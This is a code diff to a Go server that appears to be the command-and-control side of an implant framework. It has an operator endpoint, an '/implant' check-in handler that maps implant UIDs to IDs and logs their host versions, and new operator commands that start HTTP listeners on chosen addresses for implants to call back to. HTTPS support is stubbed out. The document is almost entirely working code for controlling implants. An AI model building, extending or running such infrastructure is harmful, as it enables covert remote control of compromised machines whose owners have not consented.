@@ -26,11 +26,12 @@ var cmdString string
 var uid string
 var dbDir string
 var dbPath string
-var uidToImplantIDMap = make(map[string]int)
+var ImplantMap = make(map[string]int)
 var green = "\033[32m"
 // ANSI escape code to reset text format
 var reset = "\033[0m"
 var red = "\033[31m"
+var operatorPort = "8443"
 
 type CommandQueueItem struct {
     Commands [][]string
@@ -62,13 +63,12 @@ func main() {
     defer db.Close()
 
     // Start the server in a goroutine
-    go startServer()
+    go OperatorServer()
 
     select {}
 }
 
-func startServer() {
-    http.HandleFunc("/implant", handleImplant)
+func OperatorServer() {
     http.HandleFunc("/operator", handleOperator)
     http.HandleFunc("/info", handleServerCMDs)
     serverIP, err := getServerIP()
@@ -79,16 +79,92 @@ func startServer() {
     if serverIP == "" {
         log.Fatal("Failed to determine server IP address")
     }
-    fmt.Printf("Server started at http://%s:8443\n", serverIP)
-	// Server configuration
+    
+    operatorPort = ":" + operatorPort
+	
+    fmt.Println("Server started at http://" + serverIP + operatorPort)
+    
+    // Server configuration
 	server := http.Server{
-		Addr:      ":8443",
+		Addr:      operatorPort,
 	}
 
 	// Serve
     err = server.ListenAndServe()
     defer server.Close()
 }
+
+func createListener(cmdString string, respChan chan<- string) {
+    // proto + "," + ip + "," +  port
+    parts := strings.Split(cmdString, ",")
+    if len(parts) != 3 {
+        return
+    }
+
+    listenerProto := parts[0]
+    listenerIP := parts[1]
+    listenerPort := parts[2]
+
+    // Handling different protocols
+    switch strings.ToUpper(listenerProto) {
+    case "HTTP":
+        resp := httpListener(listenerIP, listenerPort)
+        respChan <- resp
+    case "HTTPS":
+        resp := httpsListener(listenerIP, listenerPort)
+        respChan <- resp
+    default:
+        // Invalid protocol
+        resp := fmt.Sprintf("Invalid protocol: %s", listenerProto)
+        respChan <- resp
+    }    
+}
+
+
+func httpListener(listenerIP string, listenerPort string) string {
+    http.HandleFunc("/implant", handleImplant)
+
+	// Server configuration
+    server := &http.Server{
+        Addr:    listenerIP + ":" + listenerPort,
+    }
+
+    go func() {
+        if err := server.ListenAndServe(); err != nil {
+            fmt.Printf("Error starting HTTP listener: %s\n", err)
+        }
+    }()
+
+    fmt.Println("Listener started at http://" + listenerIP + ":" + listenerPort)
+    status := "listener started"
+    return status
+}
+
+func httpsListener(listenerIP string, listenerPort string) string {
+    /*
+    https.HandleFunc("/implant", handleImplant)
+
+	// Server configuration
+    server := &https.Server{
+        Addr:    listenerIP + ":" + listenerPort,
+    }
+
+    // Attempt to start the server
+    err := server.ListenAndServe()
+    if err != nil {
+        status := "Error starting HTTPS listener:", err
+        return status
+    }
+
+    fmt.Printf("Listener started at https://%s:%s\n", listenerIP, listenerPort)
+    status := "listener started"
+    return status
+    */
+    status := "Not implemented"
+    fmt.Println(status)
+    return status
+}
+
 
 func getServerIP() (string, error) {
     addrs, err := net.InterfaceAddrs()
@@ -122,7 +198,7 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 	if uid != "" {
         // Check if the UID exists in the map
         var ok bool
-        idMask, ok = uidToImplantIDMap[uid]
+        idMask, ok = ImplantMap[uid]
         if !ok {
             // UID not found in the map, call handleUID function
             handleUID(uid)
@@ -262,6 +338,7 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
 var serverresp []string
 func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
     var receivestruct Command
+    respChan := make(chan string)
 
     // Read the request body
     body, err := ioutil.ReadAll(r.Body)
@@ -286,19 +363,12 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
     }
 
     
-    cmdgroup := receivestruct.Group
-    cmdstring := receivestruct.String
+    cmdGroup := receivestruct.Group
+    cmdString := receivestruct.String
 
-    switch cmdgroup {
-    case "implant":
-        switch cmdstring {
-        case "-l":
-            listImplants()
-        default:
-            fmt.Print(red)
-            fmt.Println("Invalid command for 'implant' group. Valid command is '-l' for listing implants.")
-            fmt.Print(reset)
-        }
+    switch cmdGroup {
+    case "listener":
+        createListener(cmdString, respChan)
     case "log":
         updateConnections()
     default:
@@ -306,15 +376,15 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
         fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
         fmt.Print(reset)
     }
-
+    
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             // Respond to operator        
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    serverrespStr := strings.Join(serverresp, "")
+    respStr := <-respChan
 
     // Update the response structure with command response
-    receivestruct.Response = serverrespStr
+    receivestruct.Response = respStr
 
 
     jsonBytes, err := json.Marshal(receivestruct)
@@ -331,22 +401,22 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
     fmt.Fprintf(w, "Data: %s", response)
 }
 
-var vecconnectionlog []ConnectionLog
+var newConnections []ConnectionLog
 
 var prevLength = 0
 func updateConnections() []string {
     // New connections are added to connectionlog in addToDB()
     serverresp = nil
     // If changes were made get the changes
-    if len(vecconnectionlog) != prevLength {
+    if len(newConnections) != prevLength {
         // If changes were made, format the log
         var formattedLog string
-        for _, conn := range vecconnectionlog {
+        for _, conn := range newConnections {
             formattedLog += fmt.Sprintf("Time: %s, Host Version: %s, ID: %d\n", conn.Time, conn.HostVersion, conn.ID)
         }
         // Append the formatted log to serverresp
         serverresp = append(serverresp, formattedLog)
-        prevLength = len(vecconnectionlog)
+        prevLength = len(newConnections)
         return serverresp
     }
     return serverresp // No changes
@@ -371,8 +441,8 @@ func getVersionNamesAndUIDs() ([]string, []string, []string, error) {
     var versionNames []string
     var uids []string
 
-    // Collect all ID masks from the uidToImplantIDMap
-    for _, idMask := range uidToImplantIDMap {
+    // Collect all ID masks from the ImplantMap
+    for _, idMask := range ImplantMap {
         idMasks = append(idMasks, strconv.Itoa(idMask))
     }
 
@@ -510,7 +580,7 @@ func handleUID(uid string) {
 	}
 
     // Update the map with the uid and implant-id mapping
-    uidToImplantIDMap[uid] = IDMask
+    ImplantMap[uid] = IDMask
     
 }
 
@@ -582,7 +652,7 @@ func addToDB(uid, versionName string) (int, error) {
     currentTime := time.Now()
     timeString := currentTime.Format("2006-01-02 15:04:05")
 
-    vecconnectionlog = append(vecconnectionlog, ConnectionLog{
+    newConnections = append(newConnections, ConnectionLog{
         Time: timeString,
         HostVersion: versionName,
         ID:          IDMask,
